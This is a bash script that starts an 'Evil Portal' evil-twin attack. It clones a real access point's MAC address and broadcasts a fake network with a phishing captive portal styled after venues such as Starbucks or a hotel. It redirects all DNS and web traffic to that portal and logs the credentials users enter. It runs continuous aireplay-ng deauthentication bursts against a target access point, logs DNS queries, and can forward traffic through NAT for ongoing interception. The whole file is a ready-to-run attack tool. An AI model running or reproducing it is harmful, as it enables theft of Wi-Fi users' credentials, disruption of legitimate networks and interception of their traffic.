#!/bin/bash
# Evil Portal - Start Script with Full Evil Twin Support
# Creates fake AP with captive portal, optional MAC spoofing + deauth

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./start_portal.sh <SSID> <TEMPLATE> [BSSID] [CHANNEL] [DEAUTH_TARGET_BSSID] [PASSWORD] [POST_CAPTURE] [REDIRECT_URL] [DEAUTH_MODE]"
    echo "  SSID: Network name to broadcast"
    echo "  TEMPLATE: Portal template (starbucks, hotel, etc.)"
    echo "  BSSID: MAC to clone (optional - enables Evil Twin)"
    echo "  CHANNEL: Channel to use (default: 6)"
    echo "  DEAUTH_TARGET_BSSID: If set, continuously deauth this AP"
    echo "  PASSWORD: WPA2 password (optional - creates secured AP)"
    echo "  POST_CAPTURE: Action after creds captured (error/success/redirect/awareness/passthrough)"
    echo "  REDIRECT_URL: URL to redirect to (if POST_CAPTURE=redirect)"
    echo "  DEAUTH_MODE: single (stop after capture), multi (keep running), smart (selective)"
    exit 1
fi

SSID="$1"
TEMPLATE="$2"
CLONE_BSSID="$3"
CHANNEL="${4:-6}"
DEAUTH_TARGET="$5"
WPA2_PASSWORD="$6"
POST_CAPTURE="${7:-success}"
REDIRECT_URL="$8"
DEAUTH_MODE="${9:-single}"
INTERFACE="alfa0"
DEAUTH_INTERFACE="alfa1"
PORTAL_DIR="/home/ov3rr1d3/wifi_arsenal/portals"
SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts"
ORIGINAL_MAC_FILE="/tmp/portal_original_mac.txt"
DEAUTH_MODE_FILE="/tmp/deauth_mode.txt"

# Save deauth mode for whitelist_client.sh to read
echo "$DEAUTH_MODE" > "$DEAUTH_MODE_FILE"
# Save deauth target for smart_deauth.sh to read
echo "$DEAUTH_TARGET" > /tmp/deauth_target.txt

echo "[*] Starting Evil Portal"
echo "[*] SSID: $SSID"
echo "[*] Deauth Mode: $DEAUTH_MODE"
echo "[*] Template: $TEMPLATE"
echo "[*] Channel: $CHANNEL"
echo "[*] Interface: $INTERFACE"
[ -n "$CLONE_BSSID" ] && echo "[*] Cloning BSSID: $CLONE_BSSID (Evil Twin Mode)"
[ -n "$DEAUTH_TARGET" ] && echo "[*] Deauth Target: $DEAUTH_TARGET on $DEAUTH_INTERFACE"
[ -n "$WPA2_PASSWORD" ] && echo "[*] Security: WPA2-PSK (password set)" || echo "[*] Security: Open"
echo ""

# Check if template exists
if [ ! -f "$PORTAL_DIR/$TEMPLATE.html" ]; then
    echo "[-] Template $TEMPLATE.html not found"
    exit 1
fi

# Kill any existing portal services
echo "[*] Cleaning up existing services..."
sudo pkill -9 -f hostapd 2>/dev/null
sudo pkill -9 -f dnsmasq 2>/dev/null
sudo pkill -9 -f portal_server 2>/dev/null
sudo pkill -9 -f "aireplay-ng.*deauth" 2>/dev/null

# Wait for processes to die
sleep 2

echo "[+] Cleanup complete"

# Save original MAC before spoofing
ORIGINAL_MAC=$(cat /sys/class/net/$INTERFACE/address 2>/dev/null)
echo "$ORIGINAL_MAC" > $ORIGINAL_MAC_FILE
echo "[*] Original MAC saved: $ORIGINAL_MAC"

# Full interface reset
echo "[*] Resetting $INTERFACE..."
sudo ip link set $INTERFACE down 2>/dev/null
sudo iw dev $INTERFACE set type managed 2>/dev/null
sleep 1

# MAC Spoofing for Evil Twin
if [ -n "$CLONE_BSSID" ]; then
    echo "[*] Spoofing MAC to $CLONE_BSSID..."
    sudo ip link set $INTERFACE address $CLONE_BSSID
    sleep 1
    NEW_MAC=$(cat /sys/class/net/$INTERFACE/address)
    echo "[+] MAC changed: $NEW_MAC"
fi

# Bring interface up and configure IP
sudo ip link set $INTERFACE up
sleep 1
sudo ip addr flush dev $INTERFACE
sudo ip addr add 10.0.0.1/24 dev $INTERFACE
sleep 1

# Create hostapd config with specified channel
echo "[*] Creating hostapd config (channel $CHANNEL)..."
HOSTAPD_CONF="/tmp/hostapd_portal.conf"

if [ -n "$WPA2_PASSWORD" ]; then
    # WPA2-PSK secured AP
    echo "[*] Configuring WPA2-PSK security..."
    cat > $HOSTAPD_CONF << EOFCONF
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=$WPA2_PASSWORD
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wmm_enabled=0
ieee80211n=1
EOFCONF
else
    # Open AP (for captive portal)
    cat > $HOSTAPD_CONF << EOFCONF
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
wmm_enabled=0
ieee80211n=1
EOFCONF
fi

# Create dnsmasq config
echo "[*] Creating dnsmasq config..."
DNSMASQ_CONF="/tmp/dnsmasq_portal.conf"
# DNS log file for MITM monitoring
DNS_LOG="/home/ov3rr1d3/wifi_arsenal/captures/dns_queries.log"
touch $DNS_LOG
chmod 666 $DNS_LOG

# Passthrough mode: allow real DNS, setup NAT
if [ "$POST_CAPTURE" == "passthrough" ]; then
    echo "[*] PASSTHROUGH MODE enabled - NAT will be configured after iptables setup"
    
    # Enable IP forwarding
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
    
    # dnsmasq WITHOUT the address=/#/ trap (real DNS resolution)
    cat > $DNSMASQ_CONF << EOFCONF
interface=$INTERFACE
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
log-facility=$DNS_LOG
EOFCONF
    
    echo "[+] NAT routing enabled (alfa0 -> wlan0)"
else
    # Normal captive portal mode - trap all DNS to portal
    cat > $DNSMASQ_CONF << EOFCONF
interface=$INTERFACE
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
log-facility=$DNS_LOG
address=/#/10.0.0.1
EOFCONF
fi

# Start hostapd
echo "[*] Starting hostapd..."
sudo hostapd $HOSTAPD_CONF > /tmp/hostapd.log 2>&1 &
sleep 3

if ! pgrep hostapd > /dev/null; then
    echo "[-] Failed to start hostapd"
    cat /tmp/hostapd.log
    exit 1
fi
echo "[+] hostapd running"

# Start dnsmasq
echo "[*] Starting dnsmasq..."
sudo dnsmasq -C $DNSMASQ_CONF
sleep 2

if ! pgrep dnsmasq > /dev/null; then
    echo "[-] Failed to start dnsmasq"
    sudo pkill -9 -f hostapd
    exit 1
fi
echo "[+] dnsmasq running"

# Configure firewall and iptables
echo "[*] Configuring firewall..."
sudo ufw allow in on $INTERFACE > /dev/null 2>&1
sudo iptables -t nat -F
sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port 80

# If passthrough mode, add NAT routing rules (AFTER the redirects, so they don't get flushed)
if [ "$POST_CAPTURE" == "passthrough" ]; then
    echo "[*] Setting up NAT routing for passthrough..."
    sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
    sudo iptables -A FORWARD -i $INTERFACE -o wlan0 -j ACCEPT
    sudo iptables -A FORWARD -i wlan0 -o $INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
    echo "[+] NAT routing enabled (alfa0 -> wlan0)"
fi

# Start portal server
echo "[*] Starting portal web server..."
cd /home/ov3rr1d3/wifi_arsenal
sudo -E PORTAL_TEMPLATE="$TEMPLATE" POST_CAPTURE="$POST_CAPTURE" REDIRECT_URL="$REDIRECT_URL" python3 portal_server.py > /tmp/portal_server.log 2>&1 &
sleep 3

# Start Deauth Companion if target specified
if [ -n "$DEAUTH_TARGET" ]; then
    echo "[*] Starting Deauth Companion..."
    
    # Put deauth interface in monitor mode
    sudo ip link set $DEAUTH_INTERFACE down 2>/dev/null
    sudo iw dev $DEAUTH_INTERFACE set type monitor 2>/dev/null
    sudo ip link set $DEAUTH_INTERFACE up 2>/dev/null
    sleep 1
    
    # Set to target channel
    sudo iw dev $DEAUTH_INTERFACE set channel $CHANNEL 2>/dev/null
    
    # Start burst deauth in background (5s on, 10s off - gives time to connect)
    echo "[*] Deauthing $DEAUTH_TARGET on channel $CHANNEL (burst mode)..."
    (
        while true; do
            sudo aireplay-ng --deauth 5 -a $DEAUTH_TARGET $DEAUTH_INTERFACE >> /tmp/deauth.log 2>&1
            sleep 10
        done
    ) &
    DEAUTH_PID=$!
    echo $DEAUTH_PID > /tmp/deauth_pid.txt
    sleep 2
    
    if ps -p $DEAUTH_PID > /dev/null 2>&1; then
        echo "[+] Deauth Companion running (PID: $DEAUTH_PID)"
    else
        echo "[!] Warning: Deauth may have failed - check /tmp/deauth.log"
    fi
fi

echo ""
echo "════════════════════════════════════════════"
echo "[+] Evil Portal is ACTIVE"
echo "════════════════════════════════════════════"
echo "[+] SSID: $SSID"
[ -n "$CLONE_BSSID" ] && echo "[+] BSSID: $CLONE_BSSID (CLONED)"
echo "[+] Channel: $CHANNEL"
[ -n "$WPA2_PASSWORD" ] && echo "[+] Security: WPA2-PSK" || echo "[+] Security: Open"
echo "[+] Gateway: 10.0.0.1"
echo "[+] Template: $TEMPLATE"
[ -n "$DEAUTH_TARGET" ] && echo "[+] Deauth: ACTIVE against $DEAUTH_TARGET"
echo "[+] Credentials: captures/portal_log.txt"
echo "════════════════════════════════════════════"
echo ""
echo "[!] Run ./stop_portal.sh to shut down"
